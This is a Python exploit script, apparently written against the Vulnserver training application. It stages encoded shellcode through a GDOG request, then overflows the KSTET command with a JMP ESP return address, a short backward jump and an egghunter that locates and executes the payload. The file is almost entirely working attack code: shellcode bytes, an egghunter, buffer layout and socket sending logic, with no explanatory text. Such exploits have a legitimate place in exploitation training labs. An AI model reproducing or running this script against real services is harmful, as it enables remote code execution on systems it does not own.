#!/usr/bin/python

import socket

host = 'your ip'
port = 9999
JMP_ESP = "\xaf\x11\x50\x62"
JMP_BCK = "\x83\xEC\x44\xff\xe4"
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

buf =  b""
buf += b"\xda\xda\xbb\x1d\xe1\x1d\x96\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x52\x31\x5a\x17\x83\xc2\x04\x03\x47"
buf += b"\xf2\xff\x63\x8b\x1c\x7d\x8b\x73\xdd\xe2\x05\x96"
buf += b"\xec\x22\x71\xd3\x5f\x93\xf1\xb1\x53\x58\x57\x21"
buf += b"\xe7\x2c\x70\x46\x40\x9a\xa6\x69\x51\xb7\x9b\xe8"
buf += b"\xd1\xca\xcf\xca\xe8\x04\x02\x0b\x2c\x78\xef\x59"
buf += b"\xe5\xf6\x42\x4d\x82\x43\x5f\xe6\xd8\x42\xe7\x1b"
buf += b"\xa8\x65\xc6\x8a\xa2\x3f\xc8\x2d\x66\x34\x41\x35"
buf += b"\x6b\x71\x1b\xce\x5f\x0d\x9a\x06\xae\xee\x31\x67"
buf += b"\x1e\x1d\x4b\xa0\x99\xfe\x3e\xd8\xd9\x83\x38\x1f"
buf += b"\xa3\x5f\xcc\xbb\x03\x2b\x76\x67\xb5\xf8\xe1\xec"
buf += b"\xb9\xb5\x66\xaa\xdd\x48\xaa\xc1\xda\xc1\x4d\x05"
buf += b"\x6b\x91\x69\x81\x37\x41\x13\x90\x9d\x24\x2c\xc2"
buf += b"\x7d\x98\x88\x89\x90\xcd\xa0\xd0\xfc\x22\x89\xea"
buf += b"\xfc\x2c\x9a\x99\xce\xf3\x30\x35\x63\x7b\x9f\xc2"
buf += b"\x84\x56\x67\x5c\x7b\x59\x98\x75\xb8\x0d\xc8\xed"
buf += b"\x69\x2e\x83\xed\x96\xfb\x04\xbd\x38\x54\xe5\x6d"
buf += b"\xf9\x04\x8d\x67\xf6\x7b\xad\x88\xdc\x13\x44\x73"
buf += b"\xb7\xdb\x31\x61\xc7\xb4\x43\x95\xd6\x18\xcd\x73"
buf += b"\xb2\xb0\x9b\x2c\x2b\x28\x86\xa6\xca\xb5\x1c\xc3"
buf += b"\xcd\x3e\x93\x34\x83\xb6\xde\x26\x74\x37\x95\x14"
buf += b"\xd3\x48\x03\x30\xbf\xdb\xc8\xc0\xb6\xc7\x46\x97"
buf += b"\x9f\x36\x9f\x7d\x32\x60\x09\x63\xcf\xf4\x72\x27"
buf += b"\x14\xc5\x7d\xa6\xd9\x71\x5a\xb8\x27\x79\xe6\xec"
buf += b"\xf7\x2c\xb0\x5a\xbe\x86\x72\x34\x68\x74\xdd\xd0"
buf += b"\xed\xb6\xde\xa6\xf1\x92\xa8\x46\x43\x4b\xed\x79"
buf += b"\x6c\x1b\xf9\x02\x90\xbb\x06\xd9\x10\xdb\xe4\xcb"
buf += b"\x6c\x74\xb1\x9e\xcc\x19\x42\x75\x12\x24\xc1\x7f"
buf += b"\xeb\xd3\xd9\x0a\xee\x98\x5d\xe7\x82\xb1\x0b\x07"
buf += b"\x30\xb1\x19"

shellcode = "GDOG " + "w00tw00t" + buf 

buffer = "KSTET /.:/" + "\x90" * 20 + egghunter + (66- 20 - len(egghunter)) * "\x90" + JMP_ESP + "\x90\x90" + JMP_BCK + (5000 - 66 - len(JMP_ESP) - len(JMP_BCK) - 2) * "\x90"
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host, port))
        print("[+] Sending shellcode with GDOG command")
        s.send(shellcode)
        print(s.recv(1024))
        print("[+] Sending egghunter")
        s.send(buffer)
        s.close()

except:
        print('\nCannot connect to the server!')